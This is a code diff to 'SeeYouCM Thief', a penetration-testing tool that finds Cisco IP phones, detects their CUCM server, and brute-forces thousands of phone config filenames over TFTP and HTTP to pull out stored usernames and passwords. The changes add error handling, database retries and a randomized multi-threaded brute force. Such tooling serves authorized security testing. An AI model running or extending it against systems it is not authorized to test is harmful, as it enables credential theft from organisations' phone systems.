@@ -14,6 +14,7 @@ import sqlite3
 import time
 import threading
 import queue
+import random
 from datetime import datetime
 from contextlib import redirect_stdout, redirect_stderr
 from bs4 import BeautifulSoup
@@ -34,42 +35,41 @@ HTTP_TFTP_PORT = 6970
 HTTPS_UDS_PORT = 8443
 
 # Global variables
-verbose = False
 debug = False
 
 def banner():
     print(
-'''
+r'''
 ___________
                    /.---------.\`-._
                   //          ||    `-._
                   || `-._     ||        `-._
                   ||     `-._ ||            `-._
-                  ||    _____ ||`-._            \\
+                  ||    _____ ||`-._            \
             _..._ ||   | __ ! ||    `-._        |
-          _/     \\||   .'  |~~||        `-._    |
+          _/     \||   .'  |~~||        `-._    |
       .-``     _.`||  /   _|~~||    .----.  `-._|
-     |      _.`  _||  |  |23| ||   / :::: \\    \\
-     \\ _.--`  _.` ||  |  |56| ||  / ::::: |    |
+     |      _.`  _||  |  |23| ||   / :::: \    \
+     \ _.--`  _.` ||  |  |56| ||  / ::::: |    |
       |   _.-`  _.||  |  |79| ||  |   _..-'   /
-      _\\-`   _.`O ||  |  |_   ||  |::|        |
-    .`    _.`O `._||  \\    |  ||  |::|        |
- .-`   _.` `._.'  ||   '.__|--||  |::|        \\
-`-._.-` \\`-._     ||   | ":  !||  |  '-.._    |
-         \\   `--._||   |_:"___||  | ::::: |   |
-          \\  /\\   ||     ":":"||   \\ :::: |   |
-           \\(  `-.||       .- ||    `.___/    /
+      _\-`   _.`O ||  |  |_   ||  |::|        |
+    .`    _.`O `._||  \    |  ||  |::|        |
+ .-`   _.` `._.'  ||   '.__|--||  |::|        \
+`-._.-` \`-._     ||   | ":  !||  |  '-.._    |
+         \   `--._||   |_:"___||  | ::::: |   |
+          \  /\   ||     ":":"||   \ :::: |   |
+           \(  `-.||       .- ||    `.___/    /
            |    | ||   _.-    ||              |
-           |    / \\.-________\\____.....-----'
-           \\    -.      \\ |         |
-            \\     `.     \\ \\        |
-             `.    .'\\    \\|        |\\
-               `..'   \\    |        | \\
-                \\   .'    |       /  .`.
-                | \\.'      |       |.'   `-._
-                 \\     _ . /       \\_\\-._____)
-                  \\_.-`  .`'._____.'`.
-                    \\_\\-|             |
+           |    / \.-________\____.....-----'
+           \    -.      \ |         |
+            \     `.     \ \        |
+             `.    .'\    \|        |\
+               `..'   \    |        | \
+                \   .'    |       /  .`.
+                | \.'      |       |.'   `-._
+                 \     _ . /       \_\-._____)
+                  \_.-`  .`'._____.'`.
+                    \_\-|             |
                          `._________.'
  __________                                  _________
     SeeYouCM                                    Thief
@@ -90,7 +90,7 @@ def enumerate_phones_subnet(input):
             url = 'http://{host}/NetworkConfiguration'.format(host=host)
             try:
                 r = requests.head(url, verify=False, timeout=3)
-                if re.match("^[2]\d\d$", str(r.status_code)):
+                if re.match(r"^[2]\d\d$", str(r.status_code)):
                     http_response = requests.get(url)
                     phone_hostname = re.search(r'Host name.*(SEP[A-F0-9]{12})',http_response.text,re.IGNORECASE).group(1)
                     filename = "{phone_hostname}.cnf.xml".format(phone_hostname=phone_hostname)
@@ -123,13 +123,27 @@ def parse_subnet(html):
 
 def get_hostname_from_phone(phone):
     url = "http://{0}/CGI/Java/Serviceability?adapter=device.statistics.device".format(phone)
-    __http_response = requests.get(url)
-    if __http_response.status_code == 404:
-        if verbose:
-            print('Config file not found on HTTP Server: {0}'.format(phone))
-    else:
-        lines = __http_response.text
-    return parse_phone_hostname(lines)
+    try:
+        __http_response = requests.get(url, timeout=5)
+        if __http_response.status_code == 404:
+            if verbose:
+                print('Config file not found on HTTP Server: {0}'.format(phone))
+            return None
+        else:
+            lines = __http_response.text
+            return parse_phone_hostname(lines)
+    except requests.exceptions.Timeout:
+        if debug:
+            print(f'[!] Timeout connecting to phone {phone}')
+        return None
+    except requests.exceptions.ConnectionError:
+        if debug:
+            print(f'[!] Connection error to phone {phone}')
+        return None
+    except Exception as e:
+        if debug:
+            print(f'[!] Error getting hostname from {phone}: {str(e)}')
+        return None
 
 
 def parse_phone_hostname(html):
@@ -160,13 +174,23 @@ def hostname_resolves(hostname):
 def get_cucm_name_from_phone(phone):
     url = 'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration'.format(phone=phone)
     try:
-        __http_response = requests.get(url, timeout=2)
+        __http_response = requests.get(url, timeout=5)
         if __http_response.status_code == 404:
             url = 'http://{phone}/NetworkConfiguration'.format(phone=phone)
-            __http_response = requests.get(url)
+            __http_response = requests.get(url, timeout=5)
         return parse_cucm(__http_response.text)
+    except requests.exceptions.Timeout:
+        if debug:
+            print(f'[!] Timeout detecting CUCM from phone {phone}')
+        return None
+    except requests.exceptions.ConnectionError:
+        if debug:
+            print(f'[!] Connection error detecting CUCM from phone {phone}')
+        return None
     except Exception as e:
-        pass
+        if debug:
+            print(f'[!] Error detecting CUCM from {phone}: {str(e)}')
+        return None
 
 def get_phones_hostnames_from_reverse(input):
     hostnames = []
@@ -273,13 +297,10 @@ def download_config_tftp(CUCM_host, filename):
         with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp_file:
             temp_filename = temp_file.name
         
-        # Download the file with output suppression unless in debug mode
-        if not globals().get('debug', False):
-            with open(os.devnull, 'w') as devnull:
-                with redirect_stdout(devnull), redirect_stderr(devnull):
-                    client.download(filename, temp_filename, timeout=10)
-        else:
-            client.download(filename, temp_filename, timeout=10)
+        # Download the file
+        # Note: We suppress tftpy output via logging levels set at top of file
+        # Do NOT use redirect_stdout/stderr here as it causes issues in multi-threaded code
+        client.download(filename, temp_filename, timeout=10)
         
         # Read the content
         with open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
@@ -288,7 +309,7 @@ def download_config_tftp(CUCM_host, filename):
         # Clean up temp file
         os.unlink(temp_filename)
         
-        if verbose:
+        if debug:
             print('Successfully downloaded {0} via TFTP'.format(filename))
         
         return content
@@ -322,7 +343,7 @@ def download_config_http(CUCM_host, filename):
         if __http_response.status_code == 404:
             return None
         else:
-            if verbose:
+            if debug:
                 print('Successfully downloaded {0} via HTTP'.format(filename))
             return __http_response.text
     except Exception as e:
@@ -365,32 +386,59 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
     Worker thread for downloading config files
     
     Args:
-        work_queue: Queue of (index, full_mac, filename) tuples to process
+        work_queue: Queue of (index, full_mac, filename) or (index, full_mac, filename, cucm_host) tuples to process
         results_queue: Queue to put results (index, full_mac, content, method)
-        CUCM_host: CUCM server IP
+        CUCM_host: Default CUCM server IP (can be None if passed per-task)
         use_tftp: Whether to prefer TFTP
         backoff_manager: TFTPBackoffManager instance for rate limiting
         no_db: Whether database is disabled
         db_file: Path to database file
         force_download: Whether to force re-download
     """
+    worker_name = threading.current_thread().name
+    debug_mode = globals().get('debug', False)
+    
+    if debug_mode:
+        print(f'[DEBUG] Worker {worker_name} started')
+        sys.stdout.flush()
+    
     while True:
         try:
+            if debug_mode:
+                print(f'[DEBUG] {worker_name} waiting for task...')
+                sys.stdout.flush()
+            
             task = work_queue.get(timeout=1)
+            
+            if debug_mode:
+                print(f'[DEBUG] {worker_name} got task: {task}')
+                sys.stdout.flush()
+            
             if task is None:  # Poison pill to stop worker
                 work_queue.task_done()
                 break
             
-            index, full_mac, filename = task
+            # Support both 3-tuple and 4-tuple formats
+            if len(task) == 4:
+                index, full_mac, filename, cucm_host = task
+            else:
+                index, full_mac, filename = task
+                cucm_host = CUCM_host
+            
+            if debug_mode:
+                print(f'[DEBUG] {worker_name} processing {filename} from {cucm_host}')
+                sys.stdout.flush()
             
             # Check cache first (unless force flag is set or --no-db)
+            # Only use cached SUCCESSFUL downloads - failed attempts should be retried
             if not force_download and not no_db:
-                was_attempted, was_successful, cached_content = check_already_attempted(CUCM_host, filename, db_file)
-                if was_attempted:
-                    if was_successful and cached_content:
-                        results_queue.put((index, full_mac, cached_content, 'CACHED', True))
-                    else:
-                        results_queue.put((index, full_mac, None, 'CACHED', True))
+                was_attempted, was_successful, cached_content = check_already_attempted(cucm_host, filename, db_file)
+                if was_attempted and was_successful and cached_content:
+                    # Only skip if we have a successful cached download
+                    if debug_mode:
+                        print(f'[*] {worker_name} using cached config: {filename}')
+                        sys.stdout.flush()
+                    results_queue.put((index, full_mac, cached_content, 'CACHED', True))
                     work_queue.task_done()
                     continue
             
@@ -407,42 +455,80 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
             try:
                 if use_tftp:
                     methods_tried.append('TFTP')
-                    content = download_config_tftp(CUCM_host, filename)
+                    if debug_mode:
+                        print(f'[DEBUG] {worker_name} attempting TFTP download of {filename}')
+                        sys.stdout.flush()
+                    content = download_config_tftp(cucm_host, filename)
+                    if debug_mode:
+                        print(f'[DEBUG] {worker_name} TFTP result: {"SUCCESS" if content else "FAILED"}')
+                        sys.stdout.flush()
                     if content is None:
                         methods_tried.append('HTTP')
-                        content = download_config_http(CUCM_host, filename)
+                        if debug_mode:
+                            print(f'[DEBUG] {worker_name} attempting HTTP download of {filename}')
+                            sys.stdout.flush()
+                        content = download_config_http(cucm_host, filename)
+                        if debug_mode:
+                            print(f'[DEBUG] {worker_name} HTTP result: {"SUCCESS" if content else "FAILED"}')
+                            sys.stdout.flush()
                         method = 'HTTP' if content else 'TFTP+HTTP'
                 else:
                     methods_tried.append('HTTP')
-                    content = download_config_http(CUCM_host, filename)
+                    content = download_config_http(cucm_host, filename)
                     if content is None:
                         methods_tried.append('TFTP')
-                        content = download_config_tftp(CUCM_host, filename)
+                        content = download_config_tftp(cucm_host, filename)
                         method = 'TFTP' if content else 'HTTP+TFTP'
                 
                 if content:
                     backoff_manager.record_success()
                 else:
                     backoff_manager.record_error()
-                
+            
             except Exception as e:
                 backoff_manager.record_error()
-                if globals().get('debug', False):
-                    print(f'[!] Worker error downloading {filename}: {str(e)}')
+                if debug_mode:
+                    print(f'[!] {worker_name} error downloading {filename}: {str(e)}')
+                    import traceback
+                    traceback.print_exc()
+                    sys.stdout.flush()
             
-            # Log the attempt (unless --no-db)
-            if not no_db:
-                log_download_attempt(CUCM_host, filename, content is not None, method, content, db_file)
+            # Log only successful downloads to database (unless --no-db)
+            # Don't cache failures to allow retries
+            if not no_db and content is not None:
+                if debug_mode:
+                    print(f'[DEBUG] {worker_name} logging successful download to database')
+                    sys.stdout.flush()
+                log_download_attempt(cucm_host, filename, True, method, content, db_file)
             
+            if debug_mode:
+                print(f'[DEBUG] {worker_name} putting result in queue')
+                sys.stdout.flush()
+            elif index < 10 or index % 500 == 0:
+                # Print for first 10 and every 500th for non-debug mode
+                print(f'[{worker_name}] Task {index} complete, putting result in queue...')
+                sys.stdout.flush()
             results_queue.put((index, full_mac, content, method, False))
+            if debug_mode:
+                print(f'[DEBUG] {worker_name} marking task done')
+                sys.stdout.flush()
             work_queue.task_done()
             
         except queue.Empty:
             continue
         except Exception as e:
-            if globals().get('debug', False):
-                print(f'[!] Worker exception: {str(e)}')
-            work_queue.task_done()
+            print(f'[!] {worker_name} outer exception: {str(e)}')
+            import traceback
+            traceback.print_exc()
+            sys.stdout.flush()
+            try:
+                work_queue.task_done()
+            except:
+                pass
+    
+    if debug_mode:
+        print(f'[DEBUG] {worker_name} exiting')
+        sys.stdout.flush()
 
 def brute_force_mac_configs(CUCM_host, partial_mac, use_tftp=True, num_threads=40):
     """
@@ -550,7 +636,7 @@ def brute_force_mac_configs(CUCM_host, partial_mac, use_tftp=True, num_threads=4
         print(f'\n[+] Found {len(found_macs)} config(s): {", ".join([f"SEP{mac}" for mac in found_macs])}')
     
     if skipped > 0:
-        print(f'[*] Skipped {skipped} previously attempted files (use --force to re-download)')
+        print(f'[*] Skipped {skipped} cached config(s) from previous successful downloads (use --force to re-download)')
     
     print(f'Brute force complete: {successful}/4096 configs found')
     return found_configs
@@ -576,7 +662,7 @@ def search_for_secrets(CUCM_host, filename, use_tftp=True):
             lines = download_config_tftp(CUCM_host, filename)
     
     if lines is None:
-        if verbose:
+        if debug:
             print('Unable to download config file: {0}'.format(filename))
         return
     
@@ -596,7 +682,7 @@ def search_for_secrets(CUCM_host, filename, use_tftp=True):
                 if match.group(5):
                     user2 = match.group(5)
                     found_credentials.append(('unknown',password,filename))
-        if verbose:
+        if debug:
             if user and password:
                 print('{0}\t{1}\t{2}'.format(filename,user,password))
             elif user:
@@ -606,7 +692,7 @@ def search_for_secrets(CUCM_host, filename, use_tftp=True):
             elif user2:
                 print('Possible AD username {0} found in config {1}'.format(user2,filename))
             else:
-                if verbose:
+                if debug:
                     print('Username and password not set in {0}'.format(filename))
     except Exception as e:
         print("Could not connect to {CUCM_host}".format(CUCM_host=CUCM_host))
@@ -744,24 +830,41 @@ def check_already_attempted(cucm_host, filename, db_file='thief.db'):
 
 def log_download_attempt(cucm_host, filename, success, method, content=None, db_file='thief.db'):
     """
-    Log a download attempt to the database
+    Log a download attempt to the database with retry logic for SQLite locking
     """
-    try:
-        conn = sqlite3.connect(db_file)
-        cursor = conn.cursor()
-        
-        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        
-        cursor.execute('''
-            INSERT OR REPLACE INTO download_attempts 
-            (cucm_host, filename, attempt_time, success, method, content)
-            VALUES (?, ?, ?, ?, ?, ?)
-        ''', (cucm_host, filename, timestamp, 1 if success else 0, method, content))
-        
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        pass
+    max_retries = 5
+    retry_delay = 0.1
+    
+    for attempt in range(max_retries):
+        try:
+            conn = sqlite3.connect(db_file, timeout=30.0)
+            cursor = conn.cursor()
+            
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            
+            cursor.execute('''
+                INSERT OR REPLACE INTO download_attempts 
+                (cucm_host, filename, attempt_time, success, method, content)
+                VALUES (?, ?, ?, ?, ?, ?)
+            ''', (cucm_host, filename, timestamp, 1 if success else 0, method, content))
+            
+            conn.commit()
+            conn.close()
+            return  # Success, exit function
+        except sqlite3.OperationalError as e:
+            if "locked" in str(e).lower() and attempt < max_retries - 1:
+                # Database is locked, wait and retry
+                time.sleep(retry_delay * (2 ** attempt))  # Exponential backoff
+                continue
+            else:
+                # Give up after max retries or non-locking error
+                if globals().get('debug', False):
+                    print(f'[!] Database error: {str(e)}')
+                break
+        except Exception as e:
+            if globals().get('debug', False):
+                print(f'[!] Database error: {str(e)}')
+            break
 
 def log_credentials_to_db(cucm_host, credentials, usernames, db_file='thief.db'):
     """
@@ -994,11 +1097,10 @@ def get_phones_from_gowitness(gowitness_db):
         return []
 
 if __name__ == '__main__':
+    global found_usernames, found_credentials
+    
     # Show banner before parsing arguments so it displays with --help
     banner()
-    
-    global found_usernames
-    global found_credentials
 
     parser = argparse.ArgumentParser(description='Penetration toolkit for extracting credentials from Cisco phone systems')
     
@@ -1050,8 +1152,10 @@ if __name__ == '__main__':
                 quit(1)
     
     use_tftp = True  # TFTP is default, with automatic HTTP fallback
+    
+    # Set debug flag so worker threads can access it
     debug = args.debug
-    verbose = debug  # Verbose is an alias for debug mode
+    
     enumsubnet = args.enumsubnet
     brute_mac = args.brute_mac
     csv_output = args.csv
@@ -1090,8 +1194,11 @@ if __name__ == '__main__':
         all_found_macs = set()
         
         # Detect MACs and CUCM from each phone
+        successful_detections = 0
+        failed_detections = 0
+        
         for phone in phones:
-            print(f'Detecting MAC address from phone {phone}...')
+            print(f'[{phones.index(phone) + 1}/{len(phones)}] Detecting MAC address from phone {phone}...')
             
             try:
                 # Try to get hostname/MAC from phone
@@ -1102,7 +1209,7 @@ if __name__ == '__main__':
                     if mac_match:
                         full_mac = mac_match.group(1).upper()
                         partial_mac = full_mac[:9]
-                        print(f'  Detected: SEP{full_mac}')
+                        print(f'  ✓ Detected: SEP{full_mac}')
                         
                         # Detect CUCM for this specific phone
                         if CUCM_host:
@@ -1110,34 +1217,218 @@ if __name__ == '__main__':
                         else:
                             phone_cucm = get_cucm_name_from_phone(phone)
                             if not phone_cucm:
-                                print(f'  [-] Could not detect CUCM host from phone {phone}')
+                                print(f'  ✗ Could not detect CUCM host from phone {phone}')
+                                print(f'  → Skipping this phone, continuing with others...\n')
+                                failed_detections += 1
                                 continue
                         
-                        print(f'  CUCM Server: {phone_cucm}')
-                        print(f'  Using partial MAC: {partial_mac} for brute force\n')
+                        print(f'  ✓ CUCM Server: {phone_cucm}')
+                        print(f'  → Using partial MAC: {partial_mac} for brute force\n')
                         
                         all_found_macs.add(partial_mac)
                         mac_to_cucm[partial_mac] = phone_cucm
+                        successful_detections += 1
                     else:
-                        print(f'  [-] Could not extract MAC from hostname: {hostname}')
+                        print(f'  ✗ Could not extract MAC from hostname: {hostname}')
+                        print(f'  → Skipping this phone, continuing with others...\n')
+                        failed_detections += 1
                 else:
-                    print(f'  [-] Could not detect hostname from phone {phone}')
-                    print(f'  [-] Phone may be unreachable or not a Cisco device')
+                    print(f'  ✗ Could not detect hostname from phone {phone}')
+                    print(f'  → Phone may be unreachable or not a Cisco device')
+                    print(f'  → Skipping this phone, continuing with others...\n')
+                    failed_detections += 1
+            except KeyboardInterrupt:
+                print(f'\n[!] Interrupted by user. Stopping phone detection.')
+                break
             except Exception as e:
-                print(f'  [-] Error detecting MAC from {phone}: {str(e)}')
+                print(f'  ✗ Error detecting MAC from {phone}: {str(e)}')
+                print(f'  → Skipping this phone, continuing with others...\n')
+                failed_detections += 1
+        
+        print(f'Phone detection complete: {successful_detections} succeeded, {failed_detections} failed\n')
         
         if not all_found_macs:
             print('No MAC addresses detected. Cannot proceed with brute force.')
             quit(1)
         
-        # Brute force each unique MAC prefix with its corresponding CUCM
-        all_configs = []
+        # Build combined list of all MAC candidates from all phones
+        print(f'Building randomized candidate list for {len(all_found_macs)} MAC prefix(es)...')
+        all_candidates = []
+        
         for partial_mac in all_found_macs:
             phone_cucm = mac_to_cucm[partial_mac]
-            if debug:
-                print(f'[*] Brute forcing MAC prefix: {partial_mac} on CUCM {phone_cucm}')
-            configs = brute_force_mac_configs(phone_cucm, partial_mac, use_tftp)
-            all_configs.extend(configs)
+            # Generate all 4096 variations for this MAC prefix
+            for i in range(4096):
+                last_three_chars = f'{i:03X}'
+                full_mac = partial_mac + last_three_chars
+                filename = f'SEP{full_mac}.cnf.xml'
+                all_candidates.append((phone_cucm, full_mac, filename))
+        
+        # Randomize the order to distribute load across different MAC prefixes
+        random.shuffle(all_candidates)
+        print(f'Randomized {len(all_candidates)} total candidates across all phones\n')
+        
+        # ============================================================================
+        # Multi-threaded brute force download (ONLY used for brute force mode)
+        # Regular downloads use single-threaded search_for_secrets() function
+        # ============================================================================
+        
+        # Process all candidates with multi-threading
+        db_file = globals().get('db_file', 'thief.db')
+        no_db = globals().get('no_db', False)
+        force_download = globals().get('force_download', False)
+        
+        print(f'Starting multi-threaded brute force with 40 workers...')
+        
+        work_queue = queue.Queue()
+        results_queue = queue.Queue()
+        backoff_manager = TFTPBackoffManager()
+        num_threads = 40
+        
+        # Create and start worker threads
+        threads = []
+        for i in range(num_threads):
+            t = threading.Thread(
+                target=download_worker,
+                args=(work_queue, results_queue, None, use_tftp, backoff_manager, no_db, db_file, force_download),
+                daemon=True,
+                name=f'Worker-{i}'
+            )
+            t.start()
+            threads.append(t)
+        
+        try:
+            print(f'[*] Started {num_threads} worker threads')
+            print(f'[*] Queuing {len(all_candidates)} download tasks...')
+            sys.stdout.flush()
+        except (ValueError, AttributeError):
+            pass
+        
+        # Queue all candidates
+        for idx, (cucm, full_mac, filename) in enumerate(all_candidates):
+            work_queue.put((idx, full_mac, filename, cucm))
+            if (idx + 1) % 10000 == 0:
+                try:
+                    print(f'  Queued {idx + 1}/{len(all_candidates)} tasks...', flush=True)
+                except (ValueError, AttributeError):
+                    pass  # stdout closed or unavailable
+        
+        try:
+            print(f'[*] All {len(all_candidates)} tasks queued', flush=True)
+            print(f'[*] Processing downloads with {num_threads} workers (this may take several minutes)...\n', flush=True)
+        except (ValueError, AttributeError):
+            pass
+        
+        # Process results with progress bar
+        all_configs = []
+        found_macs = []
+        skipped = 0
+        successful = 0
+        processed = 0
+        
+        # Use alive_bar only if output is to a terminal
+        use_progress_bar = sys.stdout.isatty()
+        
+        if use_progress_bar:
+            with alive_bar(len(all_candidates), title=f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: 0") as prog_bar:
+                for _ in range(len(all_candidates)):
+                    try:
+                        index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
+                        
+                        if was_cached:
+                            skipped += 1
+                        
+                        if content:
+                            all_configs.append((full_mac, content))
+                            found_macs.append(full_mac)
+                            successful += 1
+                            # Update progress bar title with current count
+                            prog_bar.title(f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: {successful}")
+                        
+                        prog_bar()
+                            
+                    except queue.Empty:
+                        print('[!] Timeout waiting for results')
+                        break
+        else:
+            # Simple text-based progress for non-TTY output
+            try:
+                print(f'[*] Starting to process results...')
+                sys.stdout.flush()
+                
+                last_status_time = time.time()
+                for _ in range(len(all_candidates)):
+                    try:
+                        index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
+                        processed += 1
+                        
+                        if was_cached:
+                            skipped += 1
+                        
+                        if content:
+                            all_configs.append((full_mac, content))
+                            found_macs.append(full_mac)
+                            successful += 1
+                            print(f'[+] Found config #{successful}: SEP{full_mac}')
+                            sys.stdout.flush()
+                        
+                        # Print progress every 1000 items or every 5 seconds
+                        current_time = time.time()
+                        if processed % 1000 == 0 or (current_time - last_status_time) >= 5:
+                            remaining = len(all_candidates) - processed
+                            print(f'[*] Progress: {processed}/{len(all_candidates)} processed ({successful} found, {remaining} remaining)')
+                            sys.stdout.flush()
+                            last_status_time = current_time
+                            
+                    except queue.Empty:
+                        remaining = len(all_candidates) - processed
+                        print(f'[!] Timeout after processing {processed}/{len(all_candidates)} items ({remaining} remaining)')
+                        break
+                    except Exception as e:
+                        print(f'[!] ERROR in results processing: {type(e).__name__}: {e}')
+                        import traceback
+                        traceback.print_exc()
+                        sys.stdout.flush()
+                        break
+            except Exception as outer_e:
+                print(f'[!] FATAL ERROR in else block: {type(outer_e).__name__}: {outer_e}')
+                import traceback
+                traceback.print_exc()
+                sys.stdout.flush()
+        
+        # Wait for all queued work to be completed
+        try:
+            print(f'\n[*] Waiting for all workers to finish processing...')
+            sys.stdout.flush()
+        except (ValueError, AttributeError):
+            pass
+        
+        work_queue.join()
+        
+        try:
+            print(f'[*] All tasks completed!')
+            sys.stdout.flush()
+        except (ValueError, AttributeError):
+            pass
+        
+        # Send poison pills to stop workers
+        for _ in range(num_threads):
+            work_queue.put(None)
+        
+        # Wait for all workers to exit gracefully
+        for t in threads:
+            t.join()
+        
+        # Print summary
+        if found_macs:
+            mac_list = ', '.join([f"SEP{mac}" for mac in found_macs[:10]])
+            suffix = ", ..." if len(found_macs) > 10 else ""
+            print(f'\n[+] Found {len(found_macs)} config(s): {mac_list}{suffix}')
+        
+        if skipped > 0:
+            print(f'[*] Skipped {skipped} cached config(s) from previous successful downloads (use --force to re-download)')
+        
+        print(f'Brute force complete: {successful}/{len(all_candidates)} configs found')
         
         # Process all found configs
         if all_configs:
@@ -1351,7 +1642,7 @@ if __name__ == '__main__':
                 for line in api_users:
                     outputfile.write(line+'\n')
             print(f'The following {len(api_users)} users were identified from the UDS API')
-            if verbose:
+            if debug:
                 for username in api_users:
                     print('{0}'.format(username))
 
